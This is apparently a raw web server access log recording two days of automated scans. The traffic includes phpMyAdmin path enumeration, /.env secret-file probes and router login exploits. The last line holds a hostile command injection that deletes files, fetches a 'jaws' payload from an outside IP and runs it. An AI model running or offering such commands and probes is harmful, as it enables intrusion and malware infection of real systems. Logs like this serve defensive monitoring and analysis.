93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:20 -0600] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:21 -0600] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /admin/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:22 -0600] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:23 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:24 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
93.119.13.153 - - [22/Jan/2023:23:06:24 -0600] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
8.214.87.1 - - [22/Jan/2023:23:17:00 -0600] "GET / HTTP/1.1" 301 232 "-" "'Mozilla/5.0"
45.55.65.248 - - [22/Jan/2023:23:20:00 -0600] "\x16\x03\x01" 400 226 "-" "-"
45.55.65.248 - - [22/Jan/2023:23:20:00 -0600] "\x16\x03\x01" 400 226 "-" "-"
45.55.65.248 - - [22/Jan/2023:23:20:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
8.214.87.1 - - [22/Jan/2023:23:24:11 -0600] "GET / HTTP/1.1" 301 232 "-" "'Mozilla/5.0"
185.254.196.223 - - [22/Jan/2023:23:25:25 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:23:25:25 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.1.248.26 - - [22/Jan/2023:23:26:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.27.99.141 - - [22/Jan/2023:23:40:24 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
185.27.99.145 - - [22/Jan/2023:23:40:24 -0600] "GET /humans.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
185.27.99.129 - - [22/Jan/2023:23:40:24 -0600] "GET /ads.txt HTTP/1.1" 301 248 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
185.27.99.136 - - [22/Jan/2023:23:40:25 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
192.241.193.77 - - [22/Jan/2023:23:43:44 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
47.89.188.54 - - [22/Jan/2023:23:55:51 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
47.89.188.54 - - [22/Jan/2023:23:57:20 -0600] "POST /sdk HTTP/1.1" 301 235 "-" "Mozilla/5.0"
47.89.188.54 - - [22/Jan/2023:23:57:20 -0600] "GET /1674453440 HTTP/1.1" 301 242 "-" "Mozilla/5.0"
47.89.188.54 - - [22/Jan/2023:23:57:20 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
47.89.188.54 - - [22/Jan/2023:23:57:20 -0600] "GET /evox/about HTTP/1.1" 301 242 "-" "Mozilla/5.0"
47.89.188.54 - - [22/Jan/2023:23:57:20 -0600] "GET /HNAP1 HTTP/1.1" 301 237 "-" "Mozilla/5.0"
47.89.188.54 - - [22/Jan/2023:23:57:30 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
47.89.188.54 - - [22/Jan/2023:23:57:30 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
47.89.188.54 - - [22/Jan/2023:23:57:31 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
47.89.188.54 - - [22/Jan/2023:23:57:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
47.89.188.54 - - [22/Jan/2023:23:57:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
47.89.188.54 - - [22/Jan/2023:23:57:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
47.89.188.54 - - [22/Jan/2023:23:57:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
47.89.188.54 - - [22/Jan/2023:23:57:34 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "curl/7.75.0"
47.89.188.54 - - [22/Jan/2023:23:57:34 -0600] "GET / HTTP/1.1" 301 232 "-" "curl/7.64.0"
143.110.222.166 - - [23/Jan/2023:00:06:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [23/Jan/2023:00:08:45 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [23/Jan/2023:01:03:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [23/Jan/2023:01:21:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
138.255.12.130 - - [23/Jan/2023:01:25:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
207.46.13.16 - - [23/Jan/2023:01:26:00 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
207.46.13.101 - - [23/Jan/2023:01:26:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
92.118.39.82 - - [23/Jan/2023:01:44:57 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [23/Jan/2023:02:01:21 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
162.142.125.219 - - [23/Jan/2023:02:05:16 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
162.142.125.219 - - [23/Jan/2023:02:05:16 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.219 - - [23/Jan/2023:02:05:16 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
128.1.39.69 - - [23/Jan/2023:02:05:30 -0600] "\x16\x03\x01\x01\t\x01" 400 226 "-" "-"
128.1.39.69 - - [23/Jan/2023:02:05:42 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
128.1.39.69 - - [23/Jan/2023:02:05:48 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
128.1.39.69 - - [23/Jan/2023:02:05:50 -0600] "GET /robots.txt HTTP/1.1" 301 242 "-" "Go-http-client/1.1"
128.1.39.69 - - [23/Jan/2023:02:05:52 -0600] "GET /sitemap.xml HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
128.14.188.210 - - [23/Jan/2023:02:12:50 -0600] "GET /robots.txt HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
128.14.188.210 - - [23/Jan/2023:02:13:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:02:25:34 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:02:25:35 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.140.248.32 - - [23/Jan/2023:02:38:34 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.2"
143.110.222.166 - - [23/Jan/2023:03:05:25 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
64.62.197.195 - - [23/Jan/2023:03:11:39 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"
64.62.197.193 - - [23/Jan/2023:03:12:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0"
64.62.197.194 - - [23/Jan/2023:03:12:35 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84"
2a06:4880:7000::72 - - [23/Jan/2023:03:18:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
2001:470:1:332::155 - - [23/Jan/2023:03:48:55 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
2001:470:1:332::148 - - [23/Jan/2023:03:58:28 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
2001:470:1:332::148 - - [23/Jan/2023:03:58:34 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
143.110.222.166 - - [23/Jan/2023:04:04:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
60.217.75.70 - - [23/Jan/2023:04:27:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0"
190.199.186.247 - - [23/Jan/2023:05:05:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [23/Jan/2023:05:13:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
163.123.142.137 - - [23/Jan/2023:05:17:27 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
163.123.142.137 - - [23/Jan/2023:05:17:27 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
163.123.142.137 - - [23/Jan/2023:05:17:27 -0600] "GET /_profiler/phpinfo HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
163.123.142.137 - - [23/Jan/2023:05:17:28 -0600] "GET /debug/default/view?panel=config HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
163.123.142.137 - - [23/Jan/2023:05:17:28 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.27.1"
185.254.196.223 - - [23/Jan/2023:05:24:46 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:05:24:47 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [23/Jan/2023:06:03:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [23/Jan/2023:06:04:30 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
223.247.178.167 - - [23/Jan/2023:06:21:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [23/Jan/2023:06:32:03 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
173.214.175.178 - - [23/Jan/2023:06:42:28 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
143.110.222.166 - - [23/Jan/2023:07:05:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.63.196.134 - - [23/Jan/2023:07:28:27 -0600] "GET / HTTP/1.0" 301 233 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
179.43.177.242 - - [23/Jan/2023:07:34:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
87.236.176.141 - - [23/Jan/2023:08:00:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
143.110.222.166 - - [23/Jan/2023:08:05:01 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
173.214.175.178 - - [23/Jan/2023:08:15:29 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
185.254.196.223 - - [23/Jan/2023:08:26:07 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:08:26:08 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.12.253.180 - - [23/Jan/2023:08:42:46 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.12.253.180 - - [23/Jan/2023:08:42:50 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
51.159.64.143 - - [23/Jan/2023:08:48:29 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
188.161.25.148 - - [23/Jan/2023:08:49:45 -0600] "GET /agent/timeclock.php HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
31.220.1.83 - - [23/Jan/2023:09:00:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
164.92.205.224 - - [23/Jan/2023:09:03:53 -0600] "GET /aaa9 HTTP/1.1" 301 236 "-" "Mozilla/5.0 zgrab/0.x"
164.92.205.224 - - [23/Jan/2023:09:03:54 -0600] "\x16\x03\x01" 400 226 "-" "-"
164.92.205.224 - - [23/Jan/2023:09:03:54 -0600] "GET /aab8 HTTP/1.1" 301 236 "-" "Mozilla/5.0 zgrab/0.x"
164.92.205.224 - - [23/Jan/2023:09:03:55 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.110.222.166 - - [23/Jan/2023:09:06:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
173.214.175.178 - - [23/Jan/2023:09:52:20 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
143.110.222.166 - - [23/Jan/2023:10:11:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.255.85.183 - - [23/Jan/2023:10:23:15 -0600] "\x03" 400 226 "-" "-"
193.32.162.159 - - [23/Jan/2023:10:29:55 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
196.189.162.28 - - [23/Jan/2023:10:30:42 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 291 "-" "Hello, world"
